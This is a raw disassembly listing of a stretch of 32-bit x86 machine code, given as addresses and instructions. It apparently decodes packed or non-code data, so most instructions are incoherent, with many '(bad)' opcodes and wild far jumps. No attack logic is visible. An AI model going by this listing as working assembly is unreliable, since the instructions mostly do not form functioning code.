  40725a:	and    BYTE PTR [ecx-0xdfa4c49],dh
  407260:	aad    0x88
  407262:	xchg   ebp,eax
  407263:	push   esi
  407264:	xor    DWORD PTR [edi+0x6b],edx
  407267:	sub    DWORD PTR [eax],0x2d984866
  40726d:	repz in al,dx
  40726f:	push   0x24
  407271:	add    edi,DWORD PTR [edi-0x58c75e2c]
  407277:	jno    0x407214
  407279:	cmp    ch,BYTE PTR ds:0x1b44abd6
  40727f:	sub    BYTE PTR [eax-0x4f],cl
  407282:	call   0x39e5:0x46271e5e
  407289:	push   0xe775344e
  40728e:	add    ah,ch
  407290:	ja     0x40723e
  407292:	aam    0x33
  407294:	lods   eax,DWORD PTR ds:[esi]
  407295:	jmp    0xe8a5:0x2d48194
  40729c:	inc    esp
  40729d:	xchg   edx,eax
  40729e:	(bad)  
  40729f:	dec    cl
  4072a1:	shl    DWORD PTR [esi],1
  4072a3:	jmp    0x4072ab
  4072a5:	cmp    BYTE PTR [esi],dh
  4072a7:	fdiv   st,st(3)
  4072a9:	loopne 0x4072d0
  4072ab:	jae    0x4072e6
  4072ad:	nop
  4072ae:	push   es
  4072af:	mov    esp,0xbdb4e4e5
  4072b4:	outs   dx,DWORD PTR ds:[esi]
  4072b5:	and    ebp,DWORD PTR [eax-0xb]
  4072b8:	inc    ecx
  4072b9:	fs sbb esp,0x43908405
  4072c0:	jne    0x4072fd
  4072c2:	xchg   edx,eax
  4072c3:	popa   
  4072c4:	adc    al,0x36
  4072c6:	lds    eax,FWORD PTR [edi]
  4072c8:	fcomi  st,st(2)
  4072ca:	inc    ecx
  4072cb:	stos   DWORD PTR es:[edi],eax
  4072cc:	les    ebx,FWORD PTR [ebp-0x51]
  4072cf:	add    DWORD PTR [ebx+0x6b],ebp
  4072d2:	dec    ecx
  4072d3:	xor    BYTE PTR [edi],ah
  4072d5:	rcl    BYTE PTR [edx-0x5ae8979c],cl
  4072db:	xchg   BYTE PTR [eax],bh
  4072dd:	adc    bh,BYTE PTR [esi-0x40f5cf49]
  4072e3:	adc    ch,dh
  4072e5:	stos   DWORD PTR es:[edi],eax
  4072e6:	aaa    
  4072e7:	arpl   WORD PTR [ecx+0x6b1aae43],si
  4072ed:	pop    ss
  4072ee:	or     DWORD PTR [ecx+0x6c],ecx
  4072f1:	aam    0xb
  4072f3:	scas   eax,DWORD PTR es:[edi]
  4072f4:	dec    eax
  4072f5:	frstor [ebp+eiz*2+0x3d]
  4072f9:	lods   al,BYTE PTR ds:[esi]
  4072fa:	(bad)  
  4072fc:	mov    cl,0xd8
  4072fe:	dec    ecx
  4072ff:	call   0xd364865b
  407304:	jmp    0xee2f23f9
  407309:	xchg   ecx,eax
  40730a:	in     eax,dx
  40730b:	fcomi  st,st(2)
  40730d:	bound  eax,QWORD PTR [ebx-0x65]
  407310:	cmp    BYTE PTR [eax-0x78],al
  407313:	mov    ebx,0xf8458bae
  407318:	and    ecx,0x67ef
  40731e:	mov    ecx,0x7510856
  407323:	push   esi
  407324:	mov    esi,DWORD PTR ds:0x430546
  40732a:	sub    DWORD PTR ds:0x43049a,esi
  407330:	xor    eax,ecx
  407332:	mov    esi,0x32729d
  407337:	sub    DWORD PTR ds:0x42e762,0x4304aa
  407341:	add    eax,esi
  407343:	jmp    0x4074db
  407348:	mov    dl,BYTE PTR [ebp-0x1]
  40734b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40734f:	mov    DWORD PTR ds:0x4304b6,0x7329
  407359:	inc    eax
  40735a:	jmp    0x4074db
  40735f:	mov    WORD PTR [esi],cs
  407361:	jbe    0x407315
  407363:	pushf  
  407364:	pop    edx
  407365:	dec    esp
  407366:	fsub   DWORD PTR [edi-0xafddca4]
  40736c:	div    DWORD PTR [edx+0x7ecf090d]
  407372:	jle    0x407346
  407374:	jg     0x4073f4
  407376:	jle    0x407336
  407378:	pop    esi
  407379:	xor    ebp,DWORD PTR [esp+edx*2-0x30990202]
  407380:	push   es
  407381:	sahf   
  407382:	add    esi,DWORD PTR [edx-0x2182f17c]
  407388:	popa   
  407389:	adc    BYTE PTR [ecx],bl
  40738b:	jecxz  0x407393
  40738d:	cmp    bh,BYTE PTR [edx-0x20]
  407390:	cmp    al,dl
  407392:	jmp    DWORD PTR [ecx]
  407394:	ss cli 
  407396:	sub    BYTE PTR [ecx+0x36090316],bh
  40739c:	cmp    eax,0xe88969e5
  4073a1:	dec    ecx
  4073a2:	jb     0x4073df
  4073a4:	mov    ah,0x31
  4073a6:	and    BYTE PTR ds:0x9601e2dc,al
  4073ac:	inc    ebx
  4073ad:	enter  0xfde9,0x78
  4073b1:	mov    esi,0xed9ed2ba
  4073b6:	icebp  
  4073b7:	shl    BYTE PTR es:[edx+0x309e5a5a],cl
  4073be:	fiadd  DWORD PTR [esi-0x37]
  4073c1:	test   DWORD PTR ds:0x85c988e9,ebx
  4073c7:	scas   al,BYTE PTR es:[edi]
  4073c8:	js     0x407431
  4073ca:	shl    esi,cl
  4073cc:	repz inc edi
  4073ce:	push   0xa
  4073d0:	mov    BYTE PTR [eax],ch
  4073d2:	pop    eax
  4073d3:	aam    0x82
  4073d5:	div    BYTE PTR [eax-0x17]
  4073d8:	mov    ch,0x60
  4073da:	add    BYTE PTR [ebp-0x38],al
  4073dd:	xlat   BYTE PTR ds:[ebx]
  4073de:	shl    BYTE PTR [ecx],0x43
  4073e1:	jmp    0x40736c
  4073e3:	cmp    DWORD PTR cs:[ecx+esi*2+0x67],esi
  4073e8:	sub    DWORD PTR cs:[ecx],ebp
  4073eb:	sti    
  4073ec:	ja     0x40746b
  4073ee:	add    eax,DWORD PTR [ecx+0x3eecc384]
  4073f4:	icebp  
  4073f5:	or     DWORD PTR [eax+0x38],edx
  4073f8:	(bad)  
  4073f9:	adc    DWORD PTR [edi-0x69b07eea],esi
  4073ff:	xchg   esi,eax
  407400:	out    0xbf,al
  407402:	loope  0x407483
  407404:	dec    esp
  407405:	ror    BYTE PTR [edi],1
  407407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407408:	and    eax,0x350b63d4
  40740d:	jecxz  0x407468
  40740f:	cmp    bh,BYTE PTR [ebx-0x239238e6]
  407415:	repz ja 0x4073a4
  407418:	sbb    bl,BYTE PTR [esi-0x3e022888]
  40741e:	or     ebx,esp
  407420:	cld    
  407421:	dec    ebx
  407422:	push   es
  407423:	jns    0x4073e9
  407425:	sub    DWORD PTR [eax+0x76f4bba3],0xc746ea30
  40742f:	cmp    bh,cl
  407431:	push   edi
  407432:	lahf   
  407433:	fs ss sbb eax,0x7a50dc9c
  40743a:	inc    ebx
  40743b:	or     al,0x25
  40743d:	repz or ch,BYTE PTR [edx]
  407440:	push   es
  407441:	mov    dl,0xb2
  407443:	dec    esp
  407444:	retf   0xa35c
  407447:	adc    eax,0x73bac5b1
  40744c:	adc    al,0xf
  40744e:	or     esi,ecx
  407450:	xor    eax,0xb8d913c5
  407455:	mov    ch,ah
  407457:	fiadd  WORD PTR [ecx+0x32426a81]
  40745d:	mov    WORD PTR [esi+0x70e2c48d],?
  407463:	fucom  st(3)
  407465:	icebp  
  407466:	imul   esi,DWORD PTR [ebx],0x55
  407469:	push   ds
  40746a:	in     al,0x1f
  40746c:	dec    esi
  40746d:	sti    
  40746e:	retf   
  40746f:	fnstsw WORD PTR [esi]
  407471:	mov    al,ds:0xaf969d5e
  407476:	or     dh,bh
  407478:	mov    al,ds:0xa5dd155a
  40747d:	cwde   
  40747e:	(bad)  
  40747f:	(bad)  
  407480:	xchg   edx,eax
  407481:	jmp    DWORD PTR [ebx+0x4d964b92]
  407487:	xor    ebx,DWORD PTR [edi-0x3c2d15ed]
  40748d:	xor    BYTE PTR [ebp-0x3593561e],ah
  407493:	inc    edi
  407494:	in     eax,dx
  407495:	pop    edi
  407496:	retf   0xae40
  407499:	(bad)  
  40749a:	in     al,0x73
  40749c:	pop    edi
  40749d:	dec    esi
  40749e:	(bad)  
  40749f:	push   esi
  4074a0:	iret   
  4074a1:	in     eax,dx
  4074a2:	xchg   edi,eax
  4074a3:	popa   
  4074a4:	sub    eax,DWORD PTR [eax-0x7c]
  4074a7:	hlt    
  4074a8:	aas    
  4074a9:	pop    esp
  4074aa:	push   eax
  4074ab:	adc    al,0x17
  4074ad:	cmc    
  4074ae:	in     eax,0x59
  4074b0:	mov    esi,0xfdb80ad9
  4074b5:	das    
  4074b6:	lahf   
  4074b7:	leave  
  4074b8:	mov    BYTE PTR [esi-0x34250182],bh
  4074be:	adc    bh,BYTE PTR [ecx-0x1ec8d8bf]
  4074c4:	and    eax,edi
  4074c6:	sbb    al,0xe8
  4074c8:	sub    eax,0x6e2ace34
  4074cd:	jl     0x40752f
  4074cf:	mov    ecx,DWORD PTR [edx+0x79]
  4074d2:	aaa    
  4074d3:	push   edx
  4074d4:	out    dx,al
  4074d5:	mov    ebp,edx
  4074d7:	mov    WORD PTR [esi+eiz*1],?
  4074da:	sub    eax,DWORD PTR [ebx-0x7df0bf08]
  4074e0:	fs (bad) 
  4074e2:	(bad)  
  4074e3:	dec    DWORD PTR [ebx+0x458bf855]
  4074e9:	hlt    
  4074ea:	xor    edx,ecx
  4074ec:	add    edx,esi
  4074ee:	cmp    edx,eax
  4074f0:	je     0x407cbb
  4074f6:	push   ebx
  4074f7:	push   edi
  4074f8:	jmp    0x407679
  4074fd:	ins    BYTE PTR es:[edi],dx
  4074fe:	lds    edx,FWORD PTR [edx]
  407500:	cmp    BYTE PTR [ebx-0x1002839b],0xf2
  407507:	xchg   dl,dh
  407509:	adc    ah,cl
  40750b:	outs   dx,BYTE PTR ds:[esi]
  40750c:	shr    ch,1
  40750e:	sar    BYTE PTR [esi+0x7e],0xd2
  407512:	jg     0x407592
  407514:	jle    0x407501
  407516:	call   0xb3a43c92
  40751b:	lods   eax,DWORD PTR ds:[esi]
  40751c:	cmp    BYTE PTR [ecx-0x51],ah
  40751f:	data16 lods al,BYTE PTR ds:[esi]
  407521:	cli    
  407522:	push   0xbe3046d7
  407527:	push   ebp
  407528:	lea    esp,[esi+esi*4]
  40752b:	jl     0x40754c
  40752d:	stc    
  40752e:	and    bh,BYTE PTR [ebx]
  407530:	or     BYTE PTR ds:0x29c42683,cl
  407536:	loope  0x40755b
  407538:	push   ebp
  407539:	mov    ah,0xf3
  40753b:	daa    
  40753c:	adc    eax,DWORD PTR [esi-0x2d]
  40753f:	inc    ebx
  407540:	or     cl,BYTE PTR [eax+0xf]
  407543:	mov    ch,BYTE PTR [edx-0x16]
  407546:	cmp    ebp,eax
  407548:	imul   esi,DWORD PTR [edx+0x31107f93],0x178c2202
  407552:	mov    dh,0xf0
  407554:	jp     0x40758b
  407556:	and    BYTE PTR [eax-0x3f746189],ch
  40755c:	pop    ds
  40755d:	jae    0x4075dd
  40755f:	out    dx,eax
  407560:	mov    bl,0x9d
  407562:	jle    0x4075cd
  407564:	sub    bh,cl
  407566:	and    BYTE PTR ds:0xbb95ccf9,dh
  40756c:	adc    ecx,DWORD PTR [ecx+0x3546ff05]
  407572:	mov    ebx,DWORD PTR [ecx+0x1e7effa4]
  407578:	sbb    ch,BYTE PTR [edi+0x20]
  40757b:	push   cs
  40757c:	mov    dh,0x8a
  40757e:	jmp    0x7492:0x8be0d288
  407585:	inc    edi
  407586:	pop    ecx
  407587:	(bad)  
  407588:	je     0x4075ac
  40758a:	jmp    0x407567
  40758c:	push   cs
  40758d:	test   eax,0xae2ac9b4
  407592:	aas    
  407593:	inc    edi
  407594:	pop    ecx
  407595:	(bad)  
  407596:	xlat   BYTE PTR ds:[ebx]
  407597:	add    al,0x6e
  407599:	mov    ebp,0x753303a2
  40759e:	loopne 0x40753f
  4075a0:	out    0x98,eax
  4075a2:	sbb    bl,0xcb
  4075a5:	or     DWORD PTR [ebx+eax*1],0xb8ec5bd3
  4075ac:	mov    esp,DWORD PTR [esp+eax*4-0x5d18aea]
  4075b3:	shr    DWORD PTR [edx],1
  4075b5:	xor    al,0x73
  4075b7:	nop
  4075b8:	add    ch,BYTE PTR [edx+0x79]
  4075bb:	pop    esp
  4075bc:	add    ch,BYTE PTR [eax]
  4075be:	or     eax,0xf2f823a5
  4075c3:	pushf  
  4075c4:	push   esi
  4075c5:	into   
  4075c6:	call   ebx
  4075c8:	xchg   edi,eax
  4075c9:	dec    ecx
  4075ca:	pusha  
  4075cb:	inc    ebx
  4075cc:	test   eax,0x184972a1
  4075d1:	in     eax,0xa5
  4075d3:	jmp    0x407630
  4075d5:	(bad)  
  4075d6:	loop   0x40760e
  4075d8:	jmp    0x7ce830f6
  4075dd:	dec    ebp
  4075de:	(bad)  
  4075df:	fadd   DWORD PTR [ebx]
  4075e1:	inc    esp
  4075e2:	mov    dh,BYTE PTR [ebp+0x2e293c42]
  4075e8:	fmul   QWORD PTR [edx+0x25]
  4075eb:	ins    DWORD PTR es:[edi],dx
  4075ec:	imul   BYTE PTR [eax+0x29]
  4075ef:	mov    ch,dh
  4075f1:	cld    
  4075f2:	int    0x2b
  4075f4:	loope  0x40760c
  4075f6:	push   ebx
  4075f7:	ss cld 
  4075f9:	or     DWORD PTR [esi],0x5c
  4075fc:	mov    bl,0x55
  4075fe:	xchg   BYTE PTR [ebx-0x73dd341f],ch
  407604:	test   al,0x83
  407606:	cmp    eax,0xa6328e6f
  40760b:	inc    ecx
  40760c:	mov    WORD PTR ds:0xb30733c7,ds
  407612:	or     al,ch
  407614:	jmp    0x407608
  407616:	in     eax,0xc5
  407618:	in     al,dx
  407619:	dec    esi
  40761a:	dec    ebx
  40761b:	cmp    al,0x3f
  40761d:	jne    0x40762d
  40761f:	xchg   ecx,eax
  407620:	repnz mov ch,0xe6
  407623:	cmp    al,BYTE PTR ds:0x21df83f8
  407629:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40762a:	xor    eax,0x2188d1a0
  40762f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407630:	pushf  
  407631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407632:	sub    bh,BYTE PTR ss:[eax]
  407635:	mov    ds:0xab9a6921,al
  40763a:	cmp    ah,BYTE PTR [ebx+0x26]
  40763d:	inc    ebp
  40763e:	test   DWORD PTR [edx*8-0x7f48ad47],0x77bbd461
  407649:	or     al,0xc4
  40764b:	cmp    ebx,esp
  40764d:	(bad)
  407650:	in     eax,0x36
  407652:	jp     0x407613
  407654:	mov    bl,0xa9
  407656:	sbb    bh,BYTE PTR [edx+0x134d3a4c]
  40765c:	or     ecx,ecx
  40765e:	shl    DWORD PTR [edi+0x6d],1
  407661:	dec    edx
  407662:	js     0x40763d
  407664:	inc    eax
  407665:	mov    esi,0x968dee6
  40766a:	push   esp
  40766b:	in     eax,dx
  40766c:	add    BYTE PTR [ebp-0x73d89722],dh
  407672:	pop    eax
  407673:	cmp    BYTE PTR [ebx+0x35],al
  407676:	fsubp  st(7),st
  407678:	mov    ebp,0xe9087d8b
  40767d:	jl     0x407680
  40767f:	add    BYTE PTR [eax],al
  407681:	jae    0x40766e
  407683:	cmp    al,ah
  407685:	cli    
  407686:	vpaddw ymm3,ymm2,YMMWORD PTR [eax+eax*1]
  40768b:	inc    DWORD PTR [ecx]
  40768d:	(bad)  
  40768e:	push   ds
  40768f:	fwait
  407690:	jl     0x4076d3
  407692:	sar    DWORD PTR [esi+0x7e],0xd2
  407696:	jg     0x407716
  407698:	jle    0x407704
  40769a:	addr16 call 0x1e002678
  4076a0:	mov    bh,BYTE PTR [ebp-0x75]
  4076a3:	xchg   ebp,eax
  4076a4:	xchg   BYTE PTR [edi+0x5a],dl
  4076a7:	push   edx
  4076a8:	loope  0x407669
  4076aa:	adc    ecx,DWORD PTR [esi-0x6b5a74a9]
  4076b0:	cmp    BYTE PTR [eax],bh
  4076b2:	iret   
  4076b3:	ror    edx,1
  4076b5:	data16 jae 0x407730
  4076b8:	je     0x4076c4
  4076ba:	push   edx
  4076bb:	icebp  
  4076bc:	cmp    eax,0x8848b09b
  4076c1:	outs   dx,BYTE PTR fs:[esi]
  4076c3:	jb     0x407698
  4076c5:	ret    0x1a78
  4076c8:	dec    esi
  4076c9:	lgs    esi,FWORD PTR [edi-0x7d]
  4076cd:	jecxz  0x407668
  4076cf:	fldenv [edi-0x1]
  4076d2:	jno    0x40767d
  4076d4:	dec    ecx
  4076d5:	icebp  
  4076d6:	popa   
  4076d7:	mov    DWORD PTR [ebp+ecx*2+0xd],0xef31e50e
  4076df:	cdq    
  4076e0:	mov    eax,fs
  4076e2:	mov    ecx,0xc879e88f
  4076e7:	call   0x3a30617b
  4076ec:	jp     0x40774f
  4076ee:	or     al,0xc8
  4076f0:	int    0x3
  4076f2:	mov    cl,0x67
  4076f4:	mov    ds:0x4fc06839,al
  4076f9:	leave  
  4076fa:	imul   ebp,DWORD PTR [edx+0x3c962f07],0x6c
  407701:	pop    edx
  407702:	outs   dx,DWORD PTR ds:[esi]
  407703:	stos   DWORD PTR es:[edi],eax
  407704:	pop    eax
  407705:	push   edi
  407706:	or     al,BYTE PTR [ebp+0x56]
  407709:	cwde   
  40770a:	cmpxchg ecx,edx
  40770d:	jmp    0x4076c0
  40770f:	pop    ebp
  407710:	ror    BYTE PTR [esp+ecx*8],cl
  407713:	jbe    0x407736
  407715:	fstp   DWORD PTR [esi+0x13728aa4]
  40771b:	out    dx,al
  40771c:	pop    edx
  40771d:	mov    edi,0x39cbd4da
  407722:	addr16 cs push 0x6c
  407726:	repnz icebp 
  407728:	loopne 0x40770e
  40772a:	adc    ebp,0xd0e60a66
  407730:	or     DWORD PTR [ebx-0x6f9b71f7],esi
  407736:	cmp    BYTE PTR [esi],0x41
  407739:	fiadd  WORD PTR [eax-0x10]
  40773c:	sbb    dl,dh
  40773e:	fcomi  st,st(0)
  407740:	daa    
  407741:	(bad)  
  407742:	push   0xb19f340a
  407747:	and    bh,BYTE PTR [ecx]
  407749:	lahf   
  40774a:	dec    ebx
  40774b:	(bad)  
  40774c:	rol    DWORD PTR [eax-0x190f453c],1
  407752:	(bad)  
  407753:	test   al,0x59
  407755:	in     al,0xc5
  407757:	sbb    al,0xbd
  407759:	cmp    BYTE PTR [ebx-0x2412621],dl
  40775f:	imul   ebx,DWORD PTR [edi+0x3b],0xffffffd2
  407763:	add    BYTE PTR [edi-0x13567a75],ah
  407769:	push   ds
  40776a:	and    al,0xc6
  40776c:	cmp    al,0x69
  40776e:	rcr    DWORD PTR ds:0xc9025e2b,cl
  407774:	sub    ecx,DWORD PTR [edi-0x4b69da87]
  40777a:	retf   0x899
  40777d:	inc    ecx
  40777e:	dec    esp
  40777f:	scas   eax,DWORD PTR es:[edi]
  407780:	stc    
  407781:	push   ebp
  407782:	ret    
  407783:	and    eax,DWORD PTR [ebx]
  407785:	push   esi
  407786:	mov    bh,0x31
  407788:	mov    esp,DWORD PTR [ecx+0x27]
  40778b:	cdq    
  40778c:	rcr    DWORD PTR [eax-0x4a80b9e6],1
  407792:	xchg   ecx,eax
  407793:	jne    0x407738
  407795:	mov    bh,0xcb
  407797:	and    eax,0x78e2c266
  40779c:	mov    eax,0xcc639a9a
  4077a1:	cmp    bl,BYTE PTR [edi+0x3710e61a]
  4077a7:	mov    ebp,0x63ee156b
  4077ac:	jecxz  0x40778e
  4077ae:	mov    ds:0xe7757536,eax
  4077b3:	out    0xa,eax
  4077b5:	dec    ebp
  4077b6:	mov    edx,0x214c7aa2
  4077bb:	jmp    0xcce4dcb7
  4077c0:	inc    esp
  4077c1:	inc    edi
  4077c2:	push   es
  4077c3:	jae    0x4077c5
  4077c5:	ds ins DWORD PTR es:[edi],dx
  4077c7:	fisub  WORD PTR [ecx]
  4077c9:	in     al,dx
  4077ca:	cld    
  4077cb:	ins    BYTE PTR es:[edi],dx
  4077cc:	xor    eax,0x4abea56
  4077d1:	xchg   edi,eax
  4077d2:	mov    ds:0x293a5d9a,eax
  4077d7:	jl     0x40783a
  4077d9:	sbb    eax,0x9e74ea01
  4077de:	mov    ds:0x2881378a,al
  4077e3:	jnp    0x4077b0
  4077e5:	dec    esp
  4077e6:	sbb    BYTE PTR [eax],cl
  4077e8:	adc    edi,ecx
  4077ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077eb:	push   es
  4077ec:	inc    edx
  4077ed:	iret   
  4077ee:	shl    BYTE PTR [edi],1
  4077f0:	and    al,0x16
  4077f2:	loopne 0x4077ea
  4077f4:	sub    eax,0x9cb260bf
  4077f9:	lods   al,BYTE PTR ds:[esi]
  4077fa:	pop    ebp
  4077fb:	cmp    al,0x2e
  4077fd:	mov    eax,0x8a40
  407802:	xor    ax,WORD PTR [edi+edx*4+0x2]
  407807:	mov    edi,0x3b06
  40780c:	add    ax,di
  40780f:	jmp    0x407990
  407814:	push   ebp
  407815:	fsub   DWORD PTR [edx+0x557cbb2e]
  40781b:	pop    ebp
  40781c:	xchg   ecx,esp
  40781e:	push   0xd
  407820:	repz push ds
  407822:	sbb    eax,0x7ec325a5
  407827:	jle    0x4077fb
  407829:	jg     0x4078a9
  40782b:	jle    0x4077df
  40782d:	sub    ebp,DWORD PTR [esi-0x516fab44]
  407833:	mov    ecx,0x5de6a210
  407838:	(bad)
  40783b:	or     esi,DWORD PTR [ebx-0x4a3bd92a]
  407841:	push   esi
  407842:	xchg   ebp,eax
  407843:	sub    eax,0xcebb3d1d
  407848:	icebp  
  407849:	dec    edx
  40784a:	sbb    al,0x2f
  40784c:	pop    edx
  40784d:	jno    0x4077eb
  40784f:	ficomp DWORD PTR [esi]
  407851:	jae    0x407803
  407853:	les    ecx,FWORD PTR [ebp-0x74]
  407856:	sbb    al,0xbf
  407858:	jne    0x4078a0
  40785a:	mov    ecx,0x375ff2eb
  40785f:	sub    al,0xaa
  407861:	pop    esp
  407862:	push   edx
  407863:	ficom  WORD PTR [edx]
  407865:	xlat   BYTE PTR ds:[ebx]
  407866:	pop    ebp
  407867:	cmp    edx,ecx
  407869:	jo     0x4078c3
  40786b:	popf   
  40786c:	and    eax,0x4e8d5a4c
  407871:	or     DWORD PTR [ebx+0x60],edi
  407874:	loope  0x407805
  407876:	xchg   ecx,eax
  407877:	(bad)  
  407878:	dec    ecx
  407879:	ret    
  40787a:	dec    eax
  40787b:	or     BYTE PTR [edi-0x7bbcd013],cl
  407881:	(bad)  
  407882:	rcr    bl,cl
  407884:	fsubr  st(1),st
  407886:	push   ebp
  407887:	jecxz  0x407850
  407889:	pusha  
  40788a:	popa   
  40788b:	push   edx
  40788c:	push   edx
  40788d:	sbb    eax,DWORD PTR [ebx-0x12]
  407890:	dec    edi
  407891:	stc    
  407892:	inc    ebx
  407893:	mov    ebp,0xc9f14a32
  407898:	das    
  407899:	sti    
  40789a:	dec    eax
  40789b:	sti    
  40789c:	mov    ecx,0xca7c0870
  4078a1:	adc    esi,eax
  4078a3:	lock mov eax,0xea7279ee
  4078a9:	ret    0xd2ad
  4078ac:	mov    eax,DWORD PTR [edi-0x6b]
  4078af:	xor    eax,0x3b9a1a50
  4078b4:	add    eax,0x9a216bc
  4078b9:	lahf   
  4078ba:	fwait
  4078bb:	bound  edi,QWORD PTR [edx-0x9]
  4078be:	sub    ebx,0x631d6211
  4078c4:	jb     0x40793f
  4078c6:	mov    ch,0x5c
  4078c8:	js     0x4078a1
  4078ca:	aas    
  4078cb:	test   BYTE PTR [edx-0x31],ch
  4078ce:	out    dx,eax
  4078cf:	mov    bl,BYTE PTR [ebx+eiz*8-0x7ec58466]
  4078d6:	cmp    eax,0x3f3dec83
  4078db:	mov    WORD PTR ds:0xf42a6401,fs
  4078e1:	ins    DWORD PTR es:[edi],dx
  4078e2:	adc    eax,ebp
  4078e4:	in     al,dx
  4078e5:	mov    ds:0x9fc13383,al
  4078ea:	out    dx,al
  4078eb:	xchg   edx,eax
  4078ec:	repnz dec edi
  4078ee:	cmp    bh,BYTE PTR [ebp-0x80a1e5d]
  4078f4:	out    0x58,eax
  4078f6:	in     al,dx
  4078f7:	repz cmp eax,DWORD PTR [ecx]
  4078fa:	mov    eax,0x2036c489
  4078ff:	in     al,dx
  407900:	cmp    DWORD PTR [ecx+0x7c],ebp
  407903:	mov    ebp,0x24139e53
  407908:	add    bl,BYTE PTR [ecx-0x34]
  40790b:	xchg   edi,eax
  40790c:	dec    edx
  40790d:	mov    dl,bl
  40790f:	xor    BYTE PTR [ebx+0x56],bh
  407912:	or     al,BYTE PTR [edi+0x52651e19]
  407918:	and    al,0xb3
  40791a:	or     DWORD PTR [edx+0x78],edx
  40791d:	dec    ebx
  40791e:	xchg   DWORD PTR [esi-0x75742540],eax
  407924:	jecxz  0x40795d
  407926:	inc    ebp
  407927:	mov    cl,al
  407929:	js     0x4078b6
  40792b:	cmp    al,0x77
  40792d:	push   cs
  40792e:	sbb    ch,BYTE PTR [eax+0x12d09655]
  407934:	outs   dx,DWORD PTR ds:[esi]
  407935:	pop    edi
  407936:	lahf   
  407937:	xor    BYTE PTR [edx+ecx*8+0x64de43f9],ah
  40793e:	hlt    
  40793f:	fisttp QWORD PTR [ebx-0x1d]
  407942:	inc    edx
  407943:	add    BYTE PTR ds:0xd5333517,dl
  407949:	inc    ebx
  40794a:	sbb    al,0x84
  40794c:	mov    esi,0x4818a5a1
  407951:	bound  ebp,QWORD PTR [ecx+0xfe086a5]
  407957:	sbb    DWORD PTR [ecx+0x5e0e2ebf],edi
  40795d:	xor    ebx,ebp
  40795f:	(bad)  
  407960:	pop    eax
  407961:	in     eax,dx
  407962:	in     al,dx
  407963:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  407965:	cmp    cl,cl
  407967:	ds popf 
  407969:	call   0x1b00:0xcb000458
  407970:	call   0xd123d002
  407975:	mov    eax,0x6158bfc9
  40797a:	pop    ss
  40797b:	loope  0x4079b2
  40797d:	pop    ds
  40797e:	sti    
  40797f:	lods   eax,DWORD PTR ds:[esi]
  407980:	ficom  DWORD PTR [eax-0xe90976e]
  407986:	bound  edi,QWORD PTR [ebp+0x68a34a3b]
  40798c:	mov    eax,ds:0xfe9e383
  407991:	mov    bh,0xc0
  407993:	mov    DWORD PTR [ebp-0x14],eax
  407996:	jmp    0x407b17
  40799b:	xchg   ebx,eax
  40799c:	(bad)  
  40799d:	sbb    ebp,edi
  40799f:	cmp    edi,DWORD PTR [ebx+0x6b]
  4079a2:	inc    edx
  4079a3:	push   sp
  4079a5:	cwde   
  4079a6:	pop    edi
  4079a7:	xor    bh,dl
  4079a9:	pop    esp
  4079aa:	push   eax
  4079ab:	cdq    
  4079ac:	les    edi,FWORD PTR [esi+0x7e]
  4079af:	sar    BYTE PTR [edi+0x7e],cl
  4079b2:	jle    0x40793f
  4079b4:	pusha  
  4079b5:	pop    esi
  4079b6:	mov    bh,0x91
  4079b8:	add    BYTE PTR [ebp+eiz*2-0x44],0x7b
  4079bd:	and    edx,DWORD PTR [edi-0x576f61e9]
  4079c3:	popf   
  4079c4:	stos   BYTE PTR es:[edi],al
  4079c5:	or     BYTE PTR ss:[eax-0x5b],dh
  4079c9:	dec    eax
  4079ca:	inc    edx
  4079cb:	push   edx
  4079cc:	and    al,0xb4
  4079ce:	add    al,ch
  4079d0:	test   cl,0x4f
  4079d3:	les    edx,FWORD PTR [edx-0x4c]
  4079d6:	lds    eax,FWORD PTR [ecx]
  4079d8:	int3   
  4079d9:	stc    
  4079da:	mov    dl,BYTE PTR [esi+0x3e]
  4079dd:	push   ebx
  4079de:	push   edi
  4079df:	dec    ebp
  4079e0:	ins    BYTE PTR es:[edi],dx
  4079e1:	inc    edi
  4079e2:	nop
  4079e3:	jmp    0x407a35
  4079e5:	inc    esi
  4079e6:	mov    BYTE PTR [esi-0x2a151ca7],bh
  4079ec:	xchg   esi,eax
  4079ed:	icebp  
  4079ee:	pop    esi
  4079ef:	cmc    
  4079f0:	adc    dh,BYTE PTR [edx+0x23]
  4079f3:	jns    0x40798d
  4079f5:	ss mov edi,0x8bb15b41
  4079fb:	dec    ecx
  4079fc:	jge    0x407a3d
  4079fe:	js     0x4079ee
  407a00:	add    DWORD PTR [edi],esp
  407a02:	daa    
  407a03:	xor    esp,DWORD PTR [edx+ebp*2]
  407a06:	enter  0x1c0c,0xd2
  407a0a:	push   ecx
  407a0b:	mov    eax,ds:0xa5f754d2
  407a10:	mov    dl,ah
  407a12:	and    DWORD PTR [edi-0x332c130c],0x5e8b26cb
  407a1c:	gs push edx
  407a1e:	xchg   edi,eax
  407a1f:	sbb    edi,DWORD PTR [esi+0x1904b382]
  407a25:	xchg   ebx,eax
  407a26:	addr16 es test al,0xde
  407a2a:	aaa    
  407a2b:	aad    0x30
  407a2d:	mov    WORD PTR [esi+0x78],ds
  407a30:	sbb    edx,DWORD PTR [eax]
  407a32:	cmp    esp,ebp
  407a34:	and    al,0xd7
  407a36:	rcr    DWORD PTR [ecx+0x9d03fc4],cl
  407a3c:	in     al,dx
  407a3d:	pop    ecx
  407a3e:	cs xchg ebx,eax
  407a40:	lahf   
  407a41:	adc    al,0x19
  407a43:	lahf   
  407a44:	push   cs
  407a45:	loopne 0x4079ed
  407a47:	add    eax,0xbac08514
  407a4c:	xchg   ecx,eax
  407a4d:	adc    dh,ah
  407a4f:	xchg   DWORD PTR [esi-0x34a940e4],ebp
  407a55:	addr16 out 0xcd,eax
  407a58:	daa    
  407a59:	mov    al,0x8
  407a5b:	pop    ds
  407a5c:	sbb    edx,ebx
  407a5e:	(bad)  
  407a5f:	ffree  st(0)
  407a61:	jg     0x407ace
  407a63:	jmp    0x19b6:0xaecb5eb4
  407a6a:	or     BYTE PTR [ebx+0x7fd2d7c8],0x22
  407a71:	pop    ds
  407a72:	mov    ds:0x350b45b,eax
  407a77:	mov    ecx,0xed642c27
  407a7c:	ds shl bl,cl
  407a7f:	(bad)  
  407a80:	push   ebp
